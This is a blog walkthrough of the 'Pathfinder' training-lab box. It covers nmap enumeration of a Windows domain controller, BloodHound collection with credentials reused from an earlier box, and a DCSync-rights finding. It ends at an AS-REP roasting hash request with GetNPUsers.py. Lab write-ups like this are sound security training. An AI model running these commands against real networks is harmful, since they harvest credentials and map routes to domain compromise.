---
title: "Writeup: Pathfinder"
date: 2021-01-02T03:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - spathfinder
  - update
  - Windows
  - nmap
  - domain
  - neo4j
  - bloodhound-python
  - bloodhound
---

Here are notes from the named target:

**Enumeration**

NMAP

```yaml
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.30 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.30
 ```

Above nmap scan did not work and got an error on ports. Tried to do standard all ports "nmap -p- 10.10.10.30" but that said ports may be blocked by firewall 
as suggested started scan with host discovery disabled (-Pn) and it returnes results

```yaml
──(kali㉿kali)-[~]
└─$ nmap -Pn 10.10.10.30           
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 11:28 EST
Nmap scan report for 10.10.10.30
Host is up (0.063s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 4.80 seconds
```

Based on port 53 DNS, 88 Kerbos, and 389 ldap, it looks like this is a DC. I want to do a scan with a different tool to verify.

Having to dig up more info on enumerating a DC looked to [Active Directory Reconnaissence][AD-Recon[

As their were a bunch of ports open I probed thos ports with the (-sV)

```yaml
┌──(kali㉿kali)-[~]
└─$ nmap -sT -Pn -n --open 10.10.10.30 -sV -p53,88,135,139,389,445,464,593,636,3268,3269,3389
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-07 11:45 EST
Nmap scan report for 10.10.10.30
Host is up (0.065s latency).
Not shown: 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-01-08 00:53:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

```

The LDAP service is running on a couple of ports. the spec for LDAP say it has to provide some info unauthenticated so run this nmap query:

```yaml
nmap -sT -Pn -n --open 10.10.10.30 -p389 --script ldap-rootdse

──(kali㉿kali)-[~]
└─$ nmap -sT -Pn -n --open 10.10.10.30 -p389 --script ldap-rootdse

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 12:41 EST
Nmap scan report for 10.10.10.30
Host is up (0.053s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=MEGACORP,DC=LOCAL
|       ldapServiceName: MEGACORP.LOCAL:pathfinder$@MEGACORP.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       serverName: CN=PATHFINDER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 90201
|       dsServiceName: CN=NTDS Settings,CN=PATHFINDER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
|       dnsHostName: Pathfinder.MEGACORP.LOCAL
|       defaultNamingContext: DC=MEGACORP,DC=LOCAL
|       currentTime: 20210109014934.0Z
|_      configurationNamingContext: CN=Configuration,DC=MEGACORP,DC=LOCAL
Service Info: Host: PATHFINDER; OS: Windows

```

This is a DC and we have credentials to MEGACORP.Local from the Shield system we can use an AD enumeration tool called [bloodhound to get AD info.][blood-info]
Using the credentials we obtained in a previous machine; sandra:Password1234!, we can attempt to enumerate Active Directory. We can achieve this using BloodHound. There is a python bloodhound injester, which can be found here. It can also be installed using pip: pip install bloodhound:

## This is the collector for bloodhound ##

```yaml
┌──(kali㉿kali)-[~/Targets/pathfinder]
└─$ bloodhound-python -c all -u sandra -p Password1234! -ns 10.10.10.30 -d megacorp.local -gc pathfinder.megacorp.local -v
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: acl, group, rdp, psremote, trusts, session, objectprops, localadmin, dcom
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: megacorp.local
INFO: Found AD domain: megacorp.local
DEBUG: Found primary DC: Pathfinder.MEGACORP.LOCAL
DEBUG: Found Global Catalog server: Pathfinder.MEGACORP.LOCAL
DEBUG: Using LDAP server: Pathfinder.MEGACORP.LOCAL
DEBUG: Using base DN: DC=megacorp,DC=local
INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL

`
`
EBUG: Sid is cached: SVC_BES@MEGACORP.LOCAL
DEBUG: Found 580 SID: S-1-5-21-1035856440-4137329016-3276773158-1105
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.30[\PIPE\lsarpc]
DEBUG: Resolved SID to name: SANDRA@MEGACORP.LOCAL
DEBUG: Write worker obtained a None value, exiting
DEBUG: Write worker is done, closing files
INFO: Done in 00M 09S

```
Looks like we got info on several accounts sandrs, svc_bes, and administrator

Time to start up bloodhound - I already installed it:

```yaml
sudo neo4j start                                                                                                                                           1 ⨯
[sudo] password for kali: 
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
Started neo4j (pid 1740). It is available at http://localhost:7474/
There may be a short delay until the server is ready.
See /usr/share/neo4j/logs/neo4j.log for current status.
```

```yaml
bloodhound --no-sandbox
```
this will start a browser windo. - clear out previous database and drag new files to window to load them


Ensure you have a connection to the database; indicated by a ✔️ symbol at the top of the three input fields. The default username is neo4j with the password previously set.

Opening BloodHound, we can drag and drop the .json files, and BloodHound will begin to analyze the data. We can select various queries, of which some very useful ones are:

```yaml
Shortest Paths to High value Targets 
and Find Principles with DCSync Rights
```

We can see that the svc_bes has GetChangesAll privileges to the domain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes.

We always look for accounts vuln to ASREPRoasting - In Bloodhound Analysis run the last query "Find AS-REP Roastable Users (DontReqPreAuth)"
With those we can request their password TGT hash using:

```yaml
GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
```




[AD-Recon]: https://exploit.ph/active-directory-recon-1.html
[blood-info]: https://github.com/BloodHoundAD/BloodHound

